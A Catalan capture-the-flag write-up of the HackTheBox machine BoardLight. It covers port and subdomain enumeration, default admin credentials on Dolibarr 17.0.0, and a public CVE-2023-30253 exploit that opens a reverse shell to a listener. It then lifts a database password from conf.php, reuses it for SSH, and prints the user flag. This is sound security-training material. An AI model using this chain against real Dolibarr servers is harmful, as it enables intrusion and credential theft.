El primer que farem serà un nmap a la màquina que estem atacant:
``nmap -sC -sV -p- -v 10.10.11.11``

Un cop fet l'nmap, veiem que la màquina víctima té els següents ports oberts:

```
Discovered open port 80/tcp on 10.10.11.11
Discovered open port 22/tcp on 10.10.11.11
Discovered open port 8001/tcp on 10.10.11.11`
```

Amb els següents serveis:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8001/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
|_http-title: Directory listing for /
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
```

Veient que té el port 80 obert, anirem al navegador a buscar la pàgina web d'aquesta IP. El primer que veiem és el següent:

![[Pasted image 20240609185002.png]]


Hi ha un formulari a sota, on provem fer injecció SQL però sense obtenir resultats:

![[Pasted image 20240609185214.png]]

I n'hi ha un altre a Newsletter però tampoc obtenim resultats:

![[Pasted image 20240609185238.png]]

Per tant, passem a ver una enumeració de de dominis i subdominis a veure is hi ha més sort. Primer afegim el domini al fitxer /etc/hosts:

```
`┌──(polkali㉿kaliPol)-[~]
└─$ cat /etc/hosts      
127.0.0.1       localhost
127.0.1.1       kaliPol
10.10.11.233    analytical.htb
10.10.11.233    data.analytical.htb
10.10.11.227    keeper.htb tickets.keeper.htb
10.10.11.11     board.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters`
```

I ara passem a fer una cerca de dominis primer, a veure si trobem alguna cosa:

``gobuster dir --url http://board.htb / --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt``

No hi ha hagut exit i no hem trobat res destacable en quan a dominis, per tant, ara buscarem en subdominis aprofitant que hem posat el domini al fitxer /etc/hosts. Per variar i fer-ho amb una eina diferent ho faré amb fuff:

```
┌──(root㉿kaliPol)-[/home/polkali]
└─# ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -c -fs 15949`
```

Amb aquesta comanda hem fet el següent: 

- **`ffuf`**: és l'eina utilitzada per a la cerca de fòrums o subdominis.

- **`-u http://board.htb`**: especifica l'URL de destinació. En aquest cas, és `http://board.htb`.

- **`-H "Host: FUZZ.board.htb"`**: defineix l'encapçalament `Host`, on `FUZZ` serà substituït per cada subdomini provat de la llista.

- **`-w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt`**: especifica el fitxer de paraules que conté una llista de subdominis potencials. En aquest cas, s'utilitza una llista del paquet `amass` que conté els 5000 primers subdominis més populars.

- **`-c`**: activa el mode color per facilitar la visualització dels resultats.

- **`-fs 15959`**: limita els resultats a aquells que tenen una mida de resposta igual o superior a 15959 bytes. Ja que hem vist que era la mida quan hem llençat per primera vegada el fuff sense especificar -fs. Exemple:

``boards                  [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 5094ms]``

Ara, un cop hem llençat la comanda amb la mida de bytes específica, veiem que ens ha trobat el subdomini crm:

```
──(root㉿kaliPol)-[/home/polkali]
└─# ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -c -fs 15949


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/amass/wordlists/subdomains-top1mil-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 76ms]
:: Progress: [5000/5000] :: Job [1/1] :: 507 req/sec :: Duration: [0:00:14] :: Errors: 0 ::`
```

Ara però, abans d'anar a la url hem d'afegir el subdomini al fitxer /etc/hosts:

``10.10.11.11     board.htb crm.board.htb``

Un cop hi accedim ens trobem amb una pàgina de login:

![[Pasted image 20240720194050.png]]

Ens trobem amb un software que sembla ser el CRM de l'empresa que porta per nom Dolibarr, també tenim la seva versió. 

El primer que fem és buscar les seves credencials per defecte a internet, on trobem que són admin/admin:

![[Pasted image 20240720194833.png]]


Funciona, hem accedit al dashboard amb l'usuari admin: 

![[Pasted image 20240720200013.png]]

Després d'una estoneta mirant, sembla que no trobem res rellevant, per tant miraré a veure si trobo algun exploit o POC per internet de Dolibarr 17.0.0

Al fer una cerca i posar Dolibar 17.0.0 ja el pròpi navegador ens suggereix la paraula exploit, i si fem la cerca ens trobem amb  vàris POC, provarem el primer a veure si ens funciona:

![[Pasted image 20240720200256.png]]

Ara fem un git clone del repositori a la nostra màquina kali linux ja que sembla que ens podrà ser útil:

![[Pasted image 20240720200942.png]]

```
`┌──(root㉿kaliPol)-[/home/polkali/Documents]
└─# git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git                    
Cloning into 'Exploit-for-Dolibarr-17.0.0-CVE-2023-30253'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 3), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (18/18), 9.17 KiB | 1.83 MiB/s, done.
Resolving deltas: 100% (3/3), done.`
```

Donem permisos d'execució a l'exploit:

``sudo chmod +x exploit.py ``

Bàsicament ens trobem que haurem d'escoltar per un port amb la comanda per exemple:

```
nc -lvnp 4444
```

I haurem de llençar l'exploit amb la següent config:

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.90 4444
```

El POC funciona perfectament, al executar-lo: 

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└─# python3 exploit.py http://crm.board.htb admin admin 10.10.14.90 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection`
```

Ens crea la reverse shell:

```
┌──(polkali㉿kaliPol)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.90] from (UNKNOWN) [10.10.11.11] 35490
bash: cannot set terminal process group (855): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ `
```

Ara, com que hi som dins del CRM Dolibarr, busquem per internet com es configura, a veure si trobem algun fitxer que podem "remenar". Sembla que hi ha un fitxer que es diu conf.php que podria ser interessant:

![[Pasted image 20240720202217.png]]

I al següent directori trobem el fitxer conf.php:

```
`www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
ls
conf.php
conf.php.example
conf.php.old`
```

Al fitxer conf.php hi trobem unes credencials d'usuari que sembla que ens podrien ser molt útils, semblen d'una base de dades, ja que sembla que s'utilitzen per connectar amb una BD:

```
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';`
```

Per tant, provarem de connectar-nos amb les credencials que acabem d'obtenir. Però no funciona i es queda bloquejat aquí:

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ mysql -D dolibarr -u dolibarrowner -p
</htdocs/conf$ mysql -D dolibarr -u dolibarrowner -p  
Enter password: serverfun2$2023!!
show databases;`
```

Després de seguir cercant, penso que hem pogut veure com el home de l'usuari és larissa, però no hi hem pogut accedir, però, hem vist que té ssh el servidor ja que té el directori ssh, per tant, potser ens podem connectar amb l'usuari larissa per ssh. Ho provem:

```
──(root㉿kaliPol)-[/home/polkali/Documents/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└─# ssh larissa@10.10.11.11   
The authenticity of host '10.10.11.11 (10.10.11.11)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.11' (ED25519) to the list of known hosts.
larissa@10.10.11.11's password: 
Last login: Sat Jul 20 12:00:53 2024 from 10.10.14.104
larissa@boardlight:~$ `
```

Ha funcionat!! Estem a dins amb l'usuari larissa, ara anirem a buscar la flag de l'usuari:

```
larissa@boardlight:~$ ls
Desktop  dirtypipez  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
larissa@boardlight:~$ cat user.txt 
c839cad4bbb54ea6bb4e65d7da73ab00
larissa@boardlight:~$ `
```

